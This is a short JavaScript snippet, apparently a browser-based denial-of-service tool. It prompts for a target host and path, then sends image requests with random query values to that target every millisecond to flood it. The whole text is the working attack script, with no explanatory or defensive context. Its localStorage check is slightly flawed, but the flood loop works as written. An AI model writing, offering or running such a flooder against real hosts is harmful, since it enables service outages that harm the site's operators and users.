localStorage.totalTarget = 0;

if (localStorage.totalTarget === 1) {
    
} else {
    localStorage.totalTarget = 1;
    var target = prompt("target");
    var uri = prompt("uri");
}

function imgflood() {  
  var TARGET = target;
  var URI = uri;
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http://'+TARGET+URI+rand+'=val';
}
setInterval(imgflood, 1);  
